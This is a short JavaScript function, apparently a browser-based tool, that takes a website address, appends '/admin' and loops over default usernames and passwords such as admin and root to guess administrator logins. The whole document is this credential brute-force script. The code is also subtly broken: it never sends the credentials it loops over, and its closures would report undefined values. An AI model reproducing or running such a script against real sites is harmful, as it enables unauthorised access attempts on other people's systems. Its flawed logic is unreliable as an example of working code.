function bruteForce(){
    var website = document.getElementById("website").value;
    var adminPage = website + "/admin";
    var usernames = ["admin", "administrator", "root"];
    var passwords = ["password", "admin", "root"];
    for (var i = 0; i < usernames.length; i++){
        for (var j = 0; j < passwords.length; j++){
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    if (this.responseText.indexOf("Admin page") != -1){
                        alert("Admin page found! Username: " + usernames[i] + " Password: " + passwords[j]);
                    } else {
                        swal("Oops!!", "Admin Page not found!", "error");
                    }
                }
            };
            xhttp.open("GET", adminPage, true);
            xhttp.send();
        }
    }
}